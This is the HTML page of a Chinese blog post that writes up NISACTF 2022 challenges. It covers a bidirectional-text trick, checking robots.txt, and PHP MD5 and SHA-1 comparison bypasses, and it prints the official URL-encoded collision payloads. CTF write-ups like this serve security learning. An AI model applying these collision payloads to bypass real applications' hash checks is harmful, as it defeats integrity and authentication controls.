@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>nisactf2022 | css_0k的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="checkin资深师傅说 这题考的是渗透的习惯  看颜色也能发现有端倪  直接连带括号复制 然后删掉括号 得到flag 但深究他的原理 是文本中嵌入了能够改变字符顺序的特殊字符 level-uplevel 1：​        查看robots.txt文件 level 2：​        之前做过这种题 这是一个md5碰撞   比较分为两种 一种是&#x3D;&#x3D;  这种比较可以用两种方法满足  ：1.数组">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nisactf2022">
+<meta property="og:url" content="https://css0k.github.io/2022/04/01/nisactf2022/index.html">
+<meta property="og:site_name" content="css_0k的博客">
+<meta property="og:description" content="checkin资深师傅说 这题考的是渗透的习惯  看颜色也能发现有端倪  直接连带括号复制 然后删掉括号 得到flag 但深究他的原理 是文本中嵌入了能够改变字符顺序的特殊字符 level-uplevel 1：​        查看robots.txt文件 level 2：​        之前做过这种题 这是一个md5碰撞   比较分为两种 一种是&#x3D;&#x3D;  这种比较可以用两种方法满足  ：1.数组">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272327308.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272332125.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272334098.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272335572.png">
+<meta property="article:published_time" content="2022-04-01T14:33:57.000Z">
+<meta property="article:modified_time" content="2022-04-05T14:53:06.813Z">
+<meta property="article:author" content="css_0k">
+<meta property="article:tag" content="博客">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272327308.png">
+  
+    <link rel="alternate" href="/atom.xml" title="css_0k的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">css_0k的博客</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://css0k.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-nisactf2022" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/04/01/nisactf2022/" class="article-date">
+  <time datetime="2022-04-01T14:33:57.000Z" itemprop="datePublished">2022-04-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      nisactf2022
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>资深师傅说 这题考的是渗透的习惯 <img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272327308.png" alt="img"></p>
+<p>看颜色也能发现有端倪  直接连带括号复制 然后删掉括号 得到flag</p>
+<p>但深究他的原理 是文本中嵌入了能够改变字符顺序的特殊字符</p>
+<h3 id="level-up"><a href="#level-up" class="headerlink" title="level-up"></a>level-up</h3><h6 id="level-1："><a href="#level-1：" class="headerlink" title="level 1："></a>level 1：</h6><p>​        查看<code>robots.txt</code>文件</p>
+<h6 id="level-2："><a href="#level-2：" class="headerlink" title="level 2："></a>level 2：</h6><p>​        之前做过这种题 这是一个md5碰撞</p>
+<img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272332125.png" alt="img">
+
+<p>比较分为两种 一种是==  这种比较可以用两种方法满足  ：1.数组绕过   2.0e开头的数值均相同绕过</p>
+<p>上一个官方payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array1=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br><span class="line">&amp;array2=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">02</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%d5%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br></pre></td></tr></table></figure>
+
+<p>不过应该是有字符数限制 这个应该不能直接传  bp抓包</p>
+<h6 id="level-3："><a href="#level-3：" class="headerlink" title="level 3："></a>level 3：</h6><p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272334098.png" alt="img"></p>
+<p>​        sha1的强比较绕过  直接上官方payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array1=%<span class="number">25</span>PDF-<span class="number">1.3</span>%<span class="number">0</span>A%<span class="number">25</span>%E2%E3%CF%D3%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A1%<span class="number">200</span>%<span class="number">20</span>obj%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>C/Width%<span class="number">202</span>%<span class="number">200</span>%<span class="number">20</span>R/Height%<span class="number">203</span>%<span class="number">200</span>%<span class="number">20</span>R/Type%<span class="number">204</span>%<span class="number">200</span>%<span class="number">20</span>R/Subtype%<span class="number">205</span>%<span class="number">200</span>%<span class="number">20</span>R/Filter%<span class="number">206</span>%<span class="number">200</span>%<span class="number">20</span>R/ColorSpace%<span class="number">207</span>%<span class="number">200</span>%<span class="number">20</span>R/Length%<span class="number">208</span>%<span class="number">200</span>%<span class="number">20</span>R/BitsPerComponent%<span class="number">208</span>%<span class="number">3</span>E%<span class="number">3</span>E%<span class="number">0</span>Astream%<span class="number">0</span>A%FF%D8%FF%FE%<span class="number">00</span>%<span class="number">24</span>SHA-<span class="number">1</span>%<span class="number">20</span>is%<span class="number">20</span>dead%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">85</span>/%EC%<span class="number">09</span>%<span class="number">239</span>u%<span class="number">9</span>C9%B1%A1%C6%<span class="number">3</span>CL%<span class="number">97</span>%E1%FF%FE%<span class="number">01</span>%<span class="number">7</span>FF%DC%<span class="number">93</span>%A6%B6%<span class="number">7</span>E%<span class="number">01</span>%<span class="number">3</span>B%<span class="number">02</span>%<span class="number">9</span>A%AA%<span class="number">1</span>D%B2V%<span class="number">0</span>BE%CAg%D6%<span class="number">88</span>%C7%F8K%<span class="number">8</span>CLy%<span class="number">1</span>F%E0%<span class="number">2</span>B%<span class="number">3</span>D%F6%<span class="number">14</span>%F8m%B1i%<span class="number">09</span>%<span class="number">01</span>%C5kE%C1S%<span class="number">0</span>A%FE%DF%B7%<span class="number">608</span>%E9rr/%E7%ADr%<span class="number">8</span>F%<span class="number">0</span>EI%<span class="number">04</span>%E0F%C20W%<span class="number">0</span>F%E9%D4%<span class="number">13</span>%<span class="number">98</span>%AB%E1.%F5%BC%<span class="number">94</span>%<span class="number">2</span>B%E35B%A4%<span class="number">80</span>-%<span class="number">98</span>%B5%D7%<span class="number">0</span>F%<span class="number">2</span>A3.%C3%<span class="number">7</span>F%AC5%<span class="number">14</span>%E7M%DC%<span class="number">0</span>F%<span class="number">2</span>C%C1%A8t%CD%<span class="number">0</span>Cx0Z%<span class="number">21</span>Vda0%<span class="number">97</span>%<span class="number">89</span>%<span class="number">60</span>k%D0%BF%<span class="number">3</span>F%<span class="number">98</span>%CD%A8%<span class="number">04</span>F%<span class="number">29</span>%A1&amp;array2=%<span class="number">25</span>PDF-<span class="number">1.3</span>%<span class="number">0</span>A%<span class="number">25</span>%E2%E3%CF%D3%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A1%<span class="number">200</span>%<span class="number">20</span>obj%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>C/Width%<span class="number">202</span>%<span class="number">200</span>%<span class="number">20</span>R/Height%<span class="number">203</span>%<span class="number">200</span>%<span class="number">20</span>R/Type%<span class="number">204</span>%<span class="number">200</span>%<span class="number">20</span>R/Subtype%<span class="number">205</span>%<span class="number">200</span>%<span class="number">20</span>R/Filter%<span class="number">206</span>%<span class="number">200</span>%<span class="number">20</span>R/ColorSpace%<span class="number">207</span>%<span class="number">200</span>%<span class="number">20</span>R/Length%<span class="number">208</span>%<span class="number">200</span>%<span class="number">20</span>R/BitsPerComponent%<span class="number">208</span>%<span class="number">3</span>E%<span class="number">3</span>E%<span class="number">0</span>Astream%<span class="number">0</span>A%FF%D8%FF%FE%<span class="number">00</span>%<span class="number">24</span>SHA-<span class="number">1</span>%<span class="number">20</span>is%<span class="number">20</span>dead%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">85</span>/%EC%<span class="number">09</span>%<span class="number">239</span>u%<span class="number">9</span>C9%B1%A1%C6%<span class="number">3</span>CL%<span class="number">97</span>%E1%FF%FE%<span class="number">01</span>sF%DC%<span class="number">91</span>f%B6%<span class="number">7</span>E%<span class="number">11</span>%<span class="number">8</span>F%<span class="number">02</span>%<span class="number">9</span>A%B6%<span class="number">21</span>%B2V%<span class="number">0</span>F%F9%CAg%CC%A8%C7%F8%<span class="number">5</span>B%A8Ly%<span class="number">03</span>%<span class="number">0</span>C%<span class="number">2</span>B%<span class="number">3</span>D%E2%<span class="number">18</span>%F8m%B3%A9%<span class="number">09</span>%<span class="number">01</span>%D5%DFE%C1O%<span class="number">26</span>%FE%DF%B3%DC8%E9j%C2/%E7%BDr%<span class="number">8</span>F%<span class="number">0</span>EE%BC%E0F%D2%<span class="number">3</span>CW%<span class="number">0</span>F%EB%<span class="number">14</span>%<span class="number">13</span>%<span class="number">98</span>%BBU.%F5%A0%A8%<span class="number">2</span>B%E31%FE%A4%<span class="number">807</span>%B8%B5%D7%<span class="number">1</span>F%<span class="number">0E3</span>.%DF%<span class="number">93</span>%AC5%<span class="number">00</span>%EBM%DC%<span class="number">0</span>D%EC%C1%A8dy%<span class="number">0</span>Cx%<span class="number">2</span>Cv%<span class="number">21</span>V%<span class="number">60</span>%DD0%<span class="number">97</span>%<span class="number">91</span>%D0k%D0%AF%<span class="number">3</span>F%<span class="number">98</span>%CD%A4%BCF%<span class="number">29</span>%B1</span><br></pre></td></tr></table></figure>
+
+<h6 id="level-4："><a href="#level-4：" class="headerlink" title="level 4："></a>level 4：</h6><p>​        <img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272335572.png" alt="img"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://css0k.github.io/2022/04/01/nisactf2022/" data-id="cl2w3h1i30009agw5c22afijy" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/04/03/nss1/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          nss1
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/03/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABwp/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">文件包含wp</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc%E5%9B%BE%E7%89%87/" rel="tag">misc图片</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" rel="tag">图片隐写</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/misc%E5%9B%BE%E7%89%87/" style="font-size: 10px;">misc图片</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" style="font-size: 10px;">图片隐写</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">四月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/04/12/%E9%9A%90%E5%86%99%E9%A2%98%E6%80%9D%E8%B7%AF/">图片题思路</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/09/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E7%9F%A5%E8%AF%86/">图片隐写知识</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/05/1/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/04/php%E7%89%B9%E6%80%A7/">php特性</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/04/sqli-labs/">sqli-labs</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 css_0k<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
